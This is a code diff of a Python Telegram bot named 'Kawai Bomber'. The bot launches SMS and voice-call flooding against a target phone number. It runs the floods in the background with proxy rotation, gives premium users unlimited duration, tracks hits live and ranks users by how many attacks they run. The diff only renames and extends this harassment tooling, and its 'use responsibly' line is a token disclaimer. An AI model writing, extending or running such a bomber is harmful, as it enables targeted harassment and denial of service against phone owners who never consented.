-            InlineKeyboardButton(f"{EMOJIS['fire']} Both", callback_data="type_both"),
-            InlineKeyboardButton(f"{EMOJIS['zap']} Extreme", callback_data="type_extreme")
+            InlineKeyboardButton(
+                f"{EMOJIS['fire']} COMBINED",
+                callback_data="attack_both"
+            ),
+            InlineKeyboardButton(
+                f"{EMOJIS['zap']} EXTREME",
+                callback_data="attack_extreme"
+            )
         ]
     ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    reply_markup = InlineKeyboardMarkup(attack_types_keyboard)
     
     await query.edit_message_text(
-        f"{EMOJIS['bomb']} <b>Select Attack Mode:</b>\n\n"
-        f"{EMOJIS['sms']} <b>SMS Only</b> - Send SMS bomb\n"
-        f"{EMOJIS['call']} <b>Call Only</b> - Make calls only\n"
-        f"{EMOJIS['fire']} <b>Both</b> - SMS + Calls\n"
+        f"{EMOJIS['bomb']} <b>SELECT ATTACK MODE</b>\n\n"
+        f"{EMOJIS['sms']} <b>SMS Only</b> - Text message bombing\n"
+        f"{EMOJIS['call']} <b>Call Only</b> - Voice call bombing\n"
+        f"{EMOJIS['fire']} <b>Combined</b> - SMS + Calls\n"
         f"{EMOJIS['zap']} <b>Extreme</b> - Maximum aggression",
         parse_mode=ParseMode.HTML,
         reply_markup=reply_markup
@@ -574,306 +772,337 @@ async def handle_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     return BOMB_TYPE
 
-async def handle_bomb_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle bombing type selection"""
+async def handle_attack_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle attack type selection and launch attack"""
     query = update.callback_query
     await query.answer()
     
     user_id = update.effective_user.id
-    phone = context.user_data["phone"]
-    bomb_type = query.data.replace("type_", "")
+    target_phone = context.user_data["target_phone"]
+    attack_type = query.data.replace("attack_", "")
     
-    # Calculate duration (0 = unlimited for approved/admins)
+    # Determine duration based on user status
     if user_id in ADMIN_IDS or user_id in APPROVED_USERS:
-        duration = 0
-        duration_text = "∞ (Unlimited)"
+        attack_duration = 0  # Unlimited
+        duration_text = "∞ (UNLIMITED)"
     else:
-        duration = 60  # 1 hour
+        attack_duration = 60  # 1 hour
         duration_text = "60 minutes"
     
-    # Map bomb types
-    type_map = {
-        "sms": "SMS Only",
-        "call": "Call Only",
-        "both": "SMS + Call",
+    # Map attack types
+    type_display = {
+        "sms": "SMS Bombing",
+        "call": "Call Bombing",
+        "both": "Combined Attack",
         "extreme": "Extreme Mode"
     }
     
-    # Create bombing engine
-    engine = BombingEngine(phone, user_id, bomb_type)
+    # Create attack engine
+    attack_engine = AttackEngine(target_phone, user_id, attack_type)
     
-    # Store in active bombs
-    active_bombs[user_id] = {
-        "engine": engine,
-        "phone": phone,
+    # Store attack information
+    active_attacks[user_id] = {
+        "engine": attack_engine,
+        "target": target_phone,
+        "type": attack_type,
         "start_time": datetime.now(),
-        "type": bomb_type,
         "chat_id": update.effective_chat.id,
         "message_id": query.message.message_id
     }
     
-    bot_stats["active_bombs"] += 1
-    bot_stats["total_sessions"] += 1
-    user_stats[user_id]["total_sessions"] += 1
-    user_stats[user_id]["last_active"] = datetime.now()
+    # Update statistics
+    bot_statistics["active_attacks"] += 1
+    bot_statistics["total_sessions"] += 1
+    user_statistics[user_id]["total_sessions"] += 1
+    user_statistics[user_id]["last_active"] = datetime.now()
     
-    # Start bombing in background
-    asyncio.create_task(_run_bombing_session(user_id, engine, duration))
+    # Launch attack in background
+    asyncio.create_task(_execute_attack_session(user_id, attack_engine, attack_duration))
     
-    # Send initial status
-    status_text = f"""
-{EMOJIS['rocket']} <b>⚡ BOMBING INITIATED ⚡</b>
+    # Send attack initiated message
+    initiation_message = f"""
+{EMOJIS['rocket']} <b>⚡ ATTACK INITIATED ⚡</b>
 
-{EMOJIS['target']} <b>Target:</b> <code>{phone}</code>
-{EMOJIS['bomb']} <b>Mode:</b> {type_map[bomb_type]}
-{EMOJIS['clock']} <b>Duration:</b> {duration_text}
-{EMOJIS['proxy']} <b>Proxies:</b> {len(PROXY_LIST)} active
-{EMOJIS['api']} <b>APIs:</b> {len(engine.active_apis)}
+{EMOJIS['target']} <b>TARGET:</b> <code>{target_phone}</code>
+{EMOJIS['bomb']} <b>MODE:</b> {type_display[attack_type]}
+{EMOJIS['clock']} <b>DURATION:</b> {duration_text}
+{EMOJIS['proxy']} <b>PROXIES:</b> {proxy_manager.get_proxy_count()}
+{EMOJIS['api']} <b>APIS:</b> {len(attack_engine.active_apis)}
 
-{EMOJIS['zap']} <b>Status:</b> <i>Starting attack sequence...</i>
+{EMOJIS['zap']} <b>STATUS:</b> <i>Launching attack sequence...</i>
 
-{EMOJIS['warning']} Use /stop to end bombing
+{EMOJIS['warning']} Use /stop to cancel attack
 """
     
     await query.edit_message_text(
-        status_text,
+        initiation_message,
         parse_mode=ParseMode.HTML
     )
     
     # Start live updates
-    asyncio.create_task(_update_live_stats(user_id, context))
+    asyncio.create_task(_update_attack_stats(user_id, context))
     
     return ConversationHandler.END
 
-async def _run_bombing_session(user_id: int, engine: BombingEngine, duration: int):
-    """Run bombing session with time limit"""
+async def _execute_attack_session(user_id: int, engine: AttackEngine, duration: int):
+    """Execute attack session with time limit"""
     try:
-        await engine.start(duration)
+        await engine.launch_attack(duration)
     except Exception as e:
-        print(f"Bombing error for user {user_id}: {e}")
+        print(f"Attack error for user {user_id}: {str(e)}")
     finally:
-        # Clean up
-        if user_id in active_bombs:
-            bot_stats["active_bombs"] = max(0, bot_stats["active_bombs"] - 1)
-            if user_id in active_bombs:
-                del active_bombs[user_id]
+        # Clean up after attack ends
+        if user_id in active_attacks:
+            bot_statistics["active_attacks"] = max(0, bot_statistics["active_attacks"] - 1)
+            del active_attacks[user_id]
 
-async def _update_live_stats(user_id: int, context: ContextTypes.DEFAULT_TYPE):
-    """Update live bombing stats"""
-    while user_id in active_bombs:
+async def _update_attack_stats(user_id: int, context: ContextTypes.DEFAULT_TYPE):
+    """Update live attack statistics"""
+    update_interval = 3  # Seconds
+    
+    while user_id in active_attacks:
         try:
-            bomb_info = active_bombs[user_id]
-            engine = bomb_info["engine"]
-            stats = engine.get_stats()
+            attack_info = active_attacks[user_id]
+            engine = attack_info["engine"]
+            stats = engine.get_attack_stats()
             
-            # Calculate speed
-            if stats["duration"] > 0:
-                speed = stats["sent"] / stats["duration"]
-            else:
-                speed = 0
+            # Calculate progress
+            progress_percent = min(stats["success"] / 100, 1.0)
+            bar_length = 15
+            filled_bars = int(bar_length * progress_percent)
+            progress_bar = "█" * filled_bars + "░" * (bar_length - filled_bars)
             
-            # Create progress bar
-            progress = min(stats["sent"] / 50, 1.0)
-            bar_length = 10
-            filled = int(bar_length * progress)
-            bar = "█" * filled + "░" * (bar_length - filled)
+            # Calculate attack speed
+            speed_text = f"{stats['speed']:.1f}/s" if stats['speed'] > 1 else f"{stats['speed']*60:.1f}/min"
             
-            # Update message
-            status_text = f"""
-{EMOJIS['rocket']} <b>⚡ LIVE BOMBING ⚡</b>
+            # Create live update message
+            live_stats = f"""
+{EMOJIS['rocket']} <b>⚡ LIVE ATTACK IN PROGRESS ⚡</b>
 
-{EMOJIS['target']} <b>Target:</b> <code>{bomb_info['phone']}</code>
-{EMOJIS['clock']} <b>Time:</b> {int(stats['duration'])}s
+{EMOJIS['target']} <b>TARGET:</b> <code>{attack_info['target']}</code>
+{EMOJIS['clock']} <b>TIME:</b> {int(stats['duration'])}s
 
-{EMOJIS['bar_chart']} <b>Progress:</b> [{bar}]
+{EMOJIS['bar_chart']} <b>PROGRESS:</b> [{progress_bar}] {progress_percent*100:.0f}%
 
-{EMOJIS['stats']} <b>Statistics:</b>
-├─ {EMOJIS['success']} <b>Hits:</b> {stats['sent']}
-├─ {EMOJIS['error']} <b>Misses:</b> {stats['failed']}
-├─ {EMOJIS['speed']} <b>Speed:</b> {speed:.1f}/s
-└─ {EMOJIS['api']} <b>APIs:</b> {stats['active_apis']}
+{EMOJIS['stats']} <b>STATISTICS:</b>
+├─ {EMOJIS['success']} <b>HITS:</b> {stats['success']}
+├─ {EMOJIS['error']} <b>MISSES:</b> {stats['failed']}
+├─ {EMOJIS['speed']} <b>SPEED:</b> {speed_text}
+└─ {EMOJIS['api']} <b>ACTIVE APIS:</b> {stats['active_apis']}
 
-{EMOJIS['warning']} Use /stop to end
+{EMOJIS['fire']} <i>Attack is running...</i>
 """
             
             try:
                 await context.bot.edit_message_text(
-                    chat_id=bomb_info["chat_id"],
-                    message_id=bomb_info["message_id"],
-                    text=status_text,
+                    chat_id=attack_info["chat_id"],
+                    message_id=attack_info["message_id"],
+                    text=live_stats,
                     parse_mode=ParseMode.HTML
                 )
             except:
                 pass
             
-            await asyncio.sleep(3)
+            await asyncio.sleep(update_interval)
             
         except Exception as e:
             break
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Stop active bombing"""
+    """Stop active attack"""
     user_id = update.effective_user.id
     
-    if user_id not in active_bombs:
+    if user_id not in active_attacks:
         await update.message.reply_text(
-            f"{EMOJIS['warning']} <b>No active bombing session!</b>",
+            f"{EMOJIS['warning']} <b>NO ACTIVE ATTACK</b>\n\n"
+            f"You don't have any running attacks.",
             parse_mode=ParseMode.HTML
         )
         return
     
-    bomb_info = active_bombs[user_id]
-    engine = bomb_info["engine"]
-    stats = engine.get_stats()
+    attack_info = active_attacks[user_id]
+    engine = attack_info["engine"]
+    stats = engine.get_attack_stats()
     
-    # Stop engine
-    engine.stop()
+    # Stop the engine
+    engine.stop_attack()
     
-    # Send summary
-    summary_text = f"""
-{EMOJIS['success']} <b>BOMBING COMPLETED</b> {EMOJIS['success']}
+    # Calculate success rate
+    total_attempts = stats["success"] + stats["failed"]
+    success_rate = (stats["success"] / total_attempts * 100) if total_attempts > 0 else 0
+    
+    # Create summary message
+    summary_message = f"""
+{EMOJIS['victory']} <b>🎉 ATTACK COMPLETED 🎉</b>
 
-{EMOJIS['target']} <b>Target:</b> <code>{bomb_info['phone']}</code>
-{EMOJIS['clock']} <b>Duration:</b> {int(stats['duration'])}s
+{EMOJIS['target']} <b>TARGET:</b> <code>{attack_info['target']}</code>
+{EMOJIS['clock']} <b>DURATION:</b> {int(stats['duration'])} seconds
 
-{EMOJIS['trophy']} <b>Results:</b>
-├─ {EMOJIS['success']} <b>Successful:</b> {stats['sent']}
-├─ {EMOJIS['error']} <b>Failed:</b> {stats['failed']}
-├─ {EMOJIS['total']} <b>Total:</b> {stats['sent'] + stats['failed']}
-└─ {EMOJIS['api']} <b>APIs Used:</b> {stats['active_apis']}
+{EMOJIS['trophy']} <b>RESULTS:</b>
+├─ {EMOJIS['success']} <b>SUCCESSFUL:</b> {stats['success']}
+├─ {EMOJIS['error']} <b>FAILED:</b> {stats['failed']}
+├─ {EMOJIS['total']} <b>TOTAL ATTEMPTS:</b> {total_attempts}
+├─ {EMOJIS['rate']} <b>SUCCESS RATE:</b> {success_rate:.1f}%
+└─ {EMOJIS['api']} <b>APIS USED:</b> {stats['active_apis']}
 
-{EMOJIS['fire']} <b>Attack completed successfully!</b>
+{EMOJIS['fire']} <b>Attack finished successfully!</b>
 """
     
     await update.message.reply_text(
-        summary_text,
+        summary_message,
         parse_mode=ParseMode.HTML
     )
     
     # Clean up
-    if user_id in active_bombs:
-        bot_stats["active_bombs"] = max(0, bot_stats["active_bombs"] - 1)
-        del active_bombs[user_id]
+    if user_id in active_attacks:
+        bot_statistics["active_attacks"] = max(0, bot_statistics["active_attacks"] - 1)
+        del active_attacks[user_id]
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show bot status"""
-    uptime = datetime.now() - bot_stats["uptime"]
+    """Display bot statistics"""
+    uptime = datetime.now() - bot_statistics["bot_uptime"]
     hours, remainder = divmod(int(uptime.total_seconds()), 3600)
     minutes, seconds = divmod(remainder, 60)
-    uptime_str = f"{hours}h {minutes}m {seconds}s"
+    uptime_display = f"{hours}h {minutes}m {seconds}s"
     
-    status_text = f"""
-{EMOJIS['stats']} <b>📊 KAWAI BOMBER STATUS 📊</b>
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
+    # Calculate requests per minute
+    total_requests = bot_statistics["total_sms_sent"] + bot_statistics["total_calls_made"]
+    total_minutes = uptime.total_seconds() / 60
+    rpm = total_requests / total_minutes if total_minutes > 0 else 0
+    
+    status_message = f"""
+{EMOJIS['stats']} <b>📊 KAWAI BOMBER STATISTICS 📊</b>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 
-{EMOJIS['server']} <b>System Status:</b>
-├─ {EMOJIS['clock']} <b>Uptime:</b> {uptime_str}
-├─ {EMOJIS['activity']} <b>Active Bombs:</b> {bot_stats['active_bombs']}
-└─ {EMOJIS['users']} <b>Total Users:</b> {bot_stats['total_users']}
+{EMOJIS['server']} <b>SYSTEM STATUS</b>
+├─ {EMOJIS['clock']} <b>UPTIME:</b> {uptime_display}
+├─ {EMOJIS['activity']} <b>ACTIVE ATTACKS:</b> {bot_statistics['active_attacks']}
+├─ {EMOJIS['speed']} <b>REQUESTS/MIN:</b> {rpm:.1f}
+└─ {EMOJIS['users']} <b>TOTAL USERS:</b> {bot_statistics['total_users']}
 
-{EMOJIS['bomb']} <b>Attack Statistics:</b>
-├─ {EMOJIS['sms']} <b>Total SMS:</b> {bot_stats['total_sms']}
-├─ {EMOJIS['call']} <b>Total Calls:</b> {bot_stats['total_calls']}
-├─ {EMOJIS['total']} <b>Total Requests:</b> {bot_stats['total_sms'] + bot_stats['total_calls']}
-└─ {EMOJIS['sessions']} <b>Total Sessions:</b> {bot_stats['total_sessions']}
+{EMOJIS['attack']} <b>ATTACK STATISTICS</b>
+├─ {EMOJIS['sms']} <b>SMS SENT:</b> {bot_statistics['total_sms_sent']}
+├─ {EMOJIS['call']} <b>CALLS MADE:</b> {bot_statistics['total_calls_made']}
+├─ {EMOJIS['total']} <b>TOTAL HITS:</b> {bot_statistics['total_hits']}
+└─ {EMOJIS['sessions']} <b>TOTAL SESSIONS:</b> {bot_statistics['total_sessions']}
 
-{EMOJIS['proxy']} <b>Proxy System:</b>
-├─ {EMOJIS['list']} <b>Total Proxies:</b> {len(PROXY_LIST)}
-└─ {EMOJIS['rotation']} <b>Rotation:</b> Active
+{EMOJIS['proxy']} <b>PROXY SYSTEM</b>
+├─ {EMOJIS['list']} <b>TOTAL PROXIES:</b> {proxy_manager.get_proxy_count()}
+├─ {EMOJIS['working']} <b>WORKING:</b> {proxy_manager.get_proxy_count()}
+└─ {EMOJIS['rotation']} <b>ROTATION:</b> Active
 
-{EMOJIS['api']} <b>API Endpoints:</b>
-├─ {EMOJIS['sms']} <b>SMS APIs:</b> {len([a for a in APIS if a['type'] == 'sms'])}
-├─ {EMOJIS['call']} <b>Call APIs:</b> {len([a for a in APIS if a['type'] == 'call'])}
-└─ {EMOJIS['total']} <b>Total APIs:</b> {len(APIS)}
+{EMOJIS['api']} <b>API ENDPOINTS</b>
+├─ {EMOJIS['sms']} <b>SMS APIS:</b> {len([a for a in API_ENDPOINTS if a['type'] == 'sms'])}
+├─ {EMOJIS['call']} <b>CALL APIS:</b> {len([a for a in API_ENDPOINTS if a['type'] == 'call'])}
+└─ {EMOJIS['total']} <b>TOTAL APIS:</b> {len(API_ENDPOINTS)}
 
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 {EMOJIS['heart']} <i>Made by @zerocyph</i>
 {EMOJIS['power']} <i>Powered by Kawai Technology</i>
 """
     
     await update.message.reply_text(
-        status_text,
+        status_message,
         parse_mode=ParseMode.HTML
     )
 
 async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show user stats"""
+    """Display user statistics"""
     user_id = update.effective_user.id
-    stats = user_stats[user_id]
+    stats = user_statistics[user_id]
     
     total_attacks = stats["sms_count"] + stats["call_count"]
     
-    # Calculate level
-    if total_attacks < 50:
-        level = "🌱 Beginner"
+    # Calculate user rank
+    if total_attacks == 0:
+        rank = "🌱 NEWBIE"
+    elif total_attacks < 50:
+        rank = "🔥 TRAINEE"
     elif total_attacks < 200:
-        level = "🔥 Warrior"
+        rank = "⚡ WARRIOR"
     elif total_attacks < 500:
-        level = "⚡ Champion"
+        rank = "💥 VETERAN"
+    elif total_attacks < 1000:
+        rank = "🌟 ELITE"
     else:
-        level = "👑 Legend"
+        rank = "👑 LEGEND"
     
-    mystats_text = f"""
-{EMOJIS['sparkles']} <b>YOUR STATISTICS</b> {EMOJIS['sparkles']}
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
+    user_stats_message = f"""
+{EMOJIS['sparkles']} <b>YOUR PROFILE</b> {EMOJIS['sparkles']}
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 
-{EMOJIS['user']} <b>User Info:</b>
-├─ {EMOJIS['level']} <b>Level:</b> {level}
-├─ {EMOJIS['sessions']} <b>Sessions:</b> {stats['total_sessions']}
-└─ {EMOJIS['status']} <b>Status:</b> {'Premium' if user_id in APPROVED_USERS else 'Free'}
+{EMOJIS['user']} <b>USER INFO</b>
+├─ {EMOJIS['rank']} <b>RANK:</b> {rank}
+├─ {EMOJIS['level']} <b>LEVEL:</b> {total_attacks // 10 + 1}
+├─ {EMOJIS['sessions']} <b>SESSIONS:</b> {stats['total_sessions']}
+└─ {EMOJIS['status']} <b>STATUS:</b> {'Premium ⭐' if user_id in APPROVED_USERS else 'Free'}
 
-{EMOJIS['attack']} <b>Attack History:</b>
-├─ {EMOJIS['sms']} <b>SMS Sent:</b> {stats['sms_count']}
-├─ {EMOJIS['call']} <b>Calls Made:</b> {stats['call_count']}
-└─ {EMOJIS['total']} <b>Total Attacks:</b> {total_attacks}
+{EMOJIS['attack']} <b>ATTACK HISTORY</b>
+├─ {EMOJIS['sms']} <b>SMS SENT:</b> {stats['sms_count']}
+├─ {EMOJIS['call']} <b>CALLS MADE:</b> {stats['call_count']}
+├─ {EMOJIS['total']} <b>TOTAL HITS:</b> {total_attacks}
+└─ {EMOJIS['damage']} <b>TOTAL DAMAGE:</b> {stats['total_hits']}
 
-{EMOJIS['permissions']} <b>Permissions:</b>
-├─ {EMOJIS['admin']} <b>Admin:</b> {'Yes' if user_id in ADMIN_IDS else 'No'}
-├─ {EMOJIS['premium']} <b>Premium:</b> {'Yes' if user_id in APPROVED_USERS else 'No'}
-└─ {EMOJIS['limit']} <b>Time Limit:</b> {'None' if user_id in APPROVED_USERS else '60 min'}
+{EMOJIS['permissions']} <b>PERMISSIONS</b>
+├─ {EMOJIS['admin']} <b>ADMIN:</b> {'✅ Yes' if user_id in ADMIN_IDS else '❌ No'}
+├─ {EMOJIS['premium']} <b>PREMIUM:</b> {'✅ Yes' if user_id in APPROVED_USERS else '❌ No'}
+├─ {EMOJIS['ban']} <b>BANNED:</b> {'✅ Yes' if user_id in BANNED_USERS else '❌ No'}
+└─ {EMOJIS['limit']} <b>TIME LIMIT:</b> {'None ⭐' if user_id in APPROVED_USERS else '60 min'}
 
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
-{EMOJIS['fire']} <i>Keep bombing to increase your rank!</i>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+{EMOJIS['fire']} <i>Keep attacking to increase your rank!</i>
 """
     
     await update.message.reply_text(
-        mystats_text,
+        user_stats_message,
         parse_mode=ParseMode.HTML
     )
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show help"""
-    help_text = f"""
-{EMOJIS['help']} <b>KAWAI BOMBER HELP</b> {EMOJIS['help']}
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
+    """Display help information"""
+    help_message = f"""
+{EMOJIS['help']} <b>KAWAI BOMBER HELP GUIDE</b> {EMOJIS['help']}
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 
-{EMOJIS['commands']} <b>Commands:</b>
-• /start - Start bot
-• /bomb - Start bombing
-• /stop - Stop bombing
-• /status - Bot statistics
-• /mystats - Your statistics
-• /help - This message
+{EMOJIS['commands']} <b>AVAILABLE COMMANDS</b>
+├─ /start - Start the bot
+├─ /bomb - Launch attack
+├─ /stop - Stop attack
+├─ /status - View statistics
+├─ /mystats - Your profile
+└─ /help - This message
 
-{EMOJIS['warning']} <b>Important:</b>
-• Free users: 60-minute limit
-• Premium users: Unlimited time
-• Use responsibly
-• Don't target unauthorized numbers
+{EMOJIS['admin']} <b>ADMIN COMMANDS</b>
+├─ /admin - Admin panel
+├─ /addadmin <id> - Add admin
+├─ /removeadmin <id> - Remove admin
+├─ /approve <id> - Approve user
+├─ /removeuser <id> - Remove approval
+├─ /ban <id> - Ban user
+├─ /unban <id> - Unban user
+├─ /broadcast <msg> - Broadcast
+└─ /sysinfo - System info
 
-{EMOJIS['features']} <b>Features:</b>
-• Fast bombing engine
-• Proxy rotation
-• SMS & Call bombing
-• Real-time stats
-• User ranking
+{EMOJIS['warning']} <b>IMPORTANT NOTES</b>
+├─ Free users: 60-minute time limit
+├─ Premium users: Unlimited attacks
+├─ Use responsibly and ethically
+└─ Respect local laws and regulations
 
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
-{EMOJIS['heart']} <i>Made by @zerocyph</i>
+{EMOJIS['features']} <b>FEATURES</b>
+├─ Ultra-fast attack engine
+├─ 40+ proxy rotation
+├─ SMS & Call bombing
+├─ Real-time statistics
+├─ User ranking system
+└─ Anime-inspired design
+
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+{EMOJIS['heart']} <i>For support contact @zerocyph</i>
 """
     
     await update.message.reply_text(
-        help_text,
+        help_message,
         parse_mode=ParseMode.HTML
     )
 
@@ -884,102 +1113,127 @@ async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if user_id not in ADMIN_IDS:
         await update.message.reply_text(
-            f"{EMOJIS['error']} <b>Access denied!</b>",
+            f"{EMOJIS['error']} <b>ACCESS DENIED!</b>",
             parse_mode=ParseMode.HTML
         )
         return
     
-    admin_text = f"""
+    admin_panel_message = f"""
 {EMOJIS['admin']} <b>ADMIN CONTROL PANEL</b> {EMOJIS['admin']}
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 
-{EMOJIS['stats']} <b>System Stats:</b>
-├─ {EMOJIS['users']} <b>Users:</b> {len(USER_DB)}
-├─ {EMOJIS['active']} <b>Active Bombs:</b> {len(active_bombs)}
-├─ {EMOJIS['approved']} <b>Approved Users:</b> {len(APPROVED_USERS)}
-└─ {EMOJIS['banned']} <b>Banned Users:</b> {len(BANNED_USERS)}
+{EMOJIS['stats']} <b>SYSTEM OVERVIEW</b>
+├─ {EMOJIS['users']} <b>TOTAL USERS:</b> {len(USER_DATABASE)}
+├─ {EMOJIS['active']} <b>ACTIVE ATTACKS:</b> {len(active_attacks)}
+├─ {EMOJIS['approved']} <b>APPROVED USERS:</b> {len(APPROVED_USERS)}
+└─ {EMOJIS['banned']} <b>BANNED USERS:</b> {len(BANNED_USERS)}
 
-{EMOJIS['commands']} <b>Admin Commands:</b>
-• /addadmin <id> - Add admin
+{EMOJIS['commands']} <b>ADMIN COMMANDS</b>
+• /addadmin <id> - Add new admin
 • /removeadmin <id> - Remove admin
-• /approve <id> - Approve user
+• /approve <id> - Approve user (unlimited)
 • /removeuser <id> - Remove approval
-• /ban <id> - Ban user
+• /ban <id> - Ban user from bot
 • /unban <id> - Unban user
-• /broadcast <msg> - Broadcast
-• /sysinfo - System info
+• /broadcast <msg> - Send message to all
+• /sysinfo - System information
 
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 {EMOJIS['warning']} <i>Use commands responsibly!</i>
 """
     
     await update.message.reply_text(
-        admin_text,
+        admin_panel_message,
         parse_mode=ParseMode.HTML
     )
 
 async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Add admin"""
+    """Add admin user"""
     user_id = update.effective_user.id
     
     if user_id not in ADMIN_IDS:
         return
     
     if not context.args:
-        await update.message.reply_text("Usage: /addadmin <user_id>")
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Usage: /addadmin <user_id>"
+        )
         return
     
     try:
-        new_admin = int(context.args[0])
-        ADMIN_IDS.add(new_admin)
+        new_admin_id = int(context.args[0])
+        ADMIN_IDS.add(new_admin_id)
         await update.message.reply_text(
-            f"{EMOJIS['success']} Added user {new_admin} as admin!"
+            f"{EMOJIS['success']} <b>Admin added successfully!</b>\n\n"
+            f"User {new_admin_id} is now an admin.",
+            parse_mode=ParseMode.HTML
         )
-    except:
-        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")
+    except ValueError:
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Invalid user ID format!"
+        )
 
 async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Remove admin"""
+    """Remove admin user"""
     user_id = update.effective_user.id
     
     if user_id not in ADMIN_IDS:
         return
     
     if not context.args:
-        await update.message.reply_text("Usage: /removeadmin <user_id>")
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Usage: /removeadmin <user_id>"
+        )
         return
     
     try:
         admin_id = int(context.args[0])
-        if admin_id != 8291098446:  # Can't remove main admin
-            ADMIN_IDS.remove(admin_id)
+        if admin_id != 8291098446:  # Cannot remove main admin
+            ADMIN_IDS.discard(admin_id)
             await update.message.reply_text(
-                f"{EMOJIS['success']} Removed admin {admin_id}!"
+                f"{EMOJIS['success']} <b>Admin removed successfully!</b>\n\n"
+                f"User {admin_id} is no longer an admin.",
+                parse_mode=ParseMode.HTML
             )
         else:
-            await update.message.reply_text(f"{EMOJIS['error']} Cannot remove main admin!")
-    except:
-        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")
+            await update.message.reply_text(
+                f"{EMOJIS['error']} Cannot remove main admin!"
+            )
+    except ValueError:
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Invalid user ID format!"
+        )
 
 async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Approve user"""
+    """Approve user (remove time limit)"""
     user_id = update.effective_user.id
     
     if user_id not in ADMIN_IDS:
         return
     
     if not context.args:
-        await update.message.reply_text("Usage: /approve <user_id>")
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Usage: /approve <user_id>"
+        )
         return
     
     try:
         approve_id = int(context.args[0])
         APPROVED_USERS.add(approve_id)
+        
+        # Update user database
+        if approve_id in USER_DATABASE:
+            USER_DATABASE[approve_id]["is_premium"] = True
+        
         await update.message.reply_text(
-            f"{EMOJIS['success']} Approved user {approve_id}!"
+            f"{EMOJIS['success']} <b>User approved successfully!</b>\n\n"
+            f"User {approve_id} now has unlimited attack time.",
+            parse_mode=ParseMode.HTML
         )
-    except:
-        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")
+    except ValueError:
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Invalid user ID format!"
+        )
 
 async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Remove user approval"""
@@ -989,45 +1243,65 @@ async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         return
     
     if not context.args:
-        await update.message.reply_text("Usage: /removeuser <user_id>")
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Usage: /removeuser <user_id>"
+        )
         return
     
     try:
-        user_id_to_remove = int(context.args[0])
-        if user_id_to_remove in APPROVED_USERS:
-            APPROVED_USERS.remove(user_id_to_remove)
+        remove_id = int(context.args[0])
+        if remove_id in APPROVED_USERS:
+            APPROVED_USERS.remove(remove_id)
+            
+            # Update user database
+            if remove_id in USER_DATABASE:
+                USER_DATABASE[remove_id]["is_premium"] = False
+            
             await update.message.reply_text(
-                f"{EMOJIS['success']} Removed approval from user {user_id_to_remove}!"
+                f"{EMOJIS['success']} <b>Approval removed successfully!</b>\n\n"
+                f"User {remove_id} no longer has unlimited time.",
+                parse_mode=ParseMode.HTML
             )
         else:
-            await update.message.reply_text(f"{EMOJIS['warning']} User not approved!")
-    except:
-        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")
+            await update.message.reply_text(
+                f"{EMOJIS['warning']} User was not approved!"
+            )
+    except ValueError:
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Invalid user ID format!"
+        )
 
 async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Ban user"""
+    """Ban user from bot"""
     user_id = update.effective_user.id
     
     if user_id not in ADMIN_IDS:
         return
     
     if not context.args:
-        await update.message.reply_text("Usage: /ban <user_id>")
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Usage: /ban <user_id>"
+        )
         return
     
     try:
         ban_id = int(context.args[0])
         BANNED_USERS.add(ban_id)
         
-        # Stop active bombing
-        if ban_id in active_bombs:
-            del active_bombs[ban_id]
+        # Stop any active attacks
+        if ban_id in active_attacks:
+            del active_attacks[ban_id]
+            bot_statistics["active_attacks"] = max(0, bot_statistics["active_attacks"] - 1)
         
         await update.message.reply_text(
-            f"{EMOJIS['ban']} Banned user {ban_id}!"
+            f"{EMOJIS['ban']} <b>User banned successfully!</b>\n\n"
+            f"User {ban_id} can no longer use the bot.",
+            parse_mode=ParseMode.HTML
         )
-    except:
-        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")
+    except ValueError:
+        await update.message.reply_text(
+            f"{EMOJIS['error']} Invalid user ID format!"
+        )
 
 async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Unban user"""
